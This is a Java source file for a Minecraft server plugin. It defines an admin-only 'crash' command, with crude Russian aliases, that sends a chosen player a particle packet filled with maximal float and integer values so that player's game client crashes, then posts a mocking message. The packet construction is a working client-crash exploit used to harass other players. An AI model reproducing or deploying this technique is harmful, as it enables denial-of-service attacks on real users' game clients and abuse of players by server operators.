package net.plazmix.command.impl;

import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
import net.plazmix.command.BaseCommand;
import net.plazmix.coreconnector.core.group.Group;
import net.plazmix.utility.player.PlazmixUser;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

public class CrashCommand extends BaseCommand<Player> {

    public CrashCommand() {
        super("crash", "краш", "пизда", "гг", "gg", "pizda");
        setMinimalGroup(Group.ADMIN);
    }

    @Override
    protected void onExecute(Player player, String[] args) {
        PlazmixUser plazmixUser = PlazmixUser.of(player);

        if (args.length < 1) {
            plazmixUser.localization().sendMessage("CRASH_HELP");
            return;
        }

        PlazmixUser targetPlayer = PlazmixUser.of(args[0]);

        if (targetPlayer.handle() == null) {
            plazmixUser.localization().sendMessage("PLAYER_OFFLINE");
            return;
        }

        if (targetPlayer.getGroup().isStaff()) {
            plazmixUser.localization().sendMessage("PLAYER_BYPASS");
            return;
        }

        CraftPlayer craftPlayer = ((CraftPlayer) Bukkit.getPlayer(args[0]));
        PacketPlayOutWorldParticles crashParticle = new PacketPlayOutWorldParticles(EnumParticle.CLOUD, true, 2.14748365E9F, 2.14748365E9F, 2.14748365E9F, 2.14748365E9F, 2.14748365E9F, 2.14748365E9F, 2.14748365E9F, 2147483647);

        craftPlayer.playSound(craftPlayer.getLocation(), Sound.IRONGOLEM_HIT, 1.0F, 1.0F);
        craftPlayer.playSound(craftPlayer.getLocation(), Sound.CREEPER_DEATH, 1.0F, 1.0F);

        craftPlayer.getHandle().playerConnection.sendPacket(crashParticle);

        player.sendMessage("§d§lCrash §8:: " + targetPlayer.getDisplayName() + " §fполучил пиздюлей");
    }
}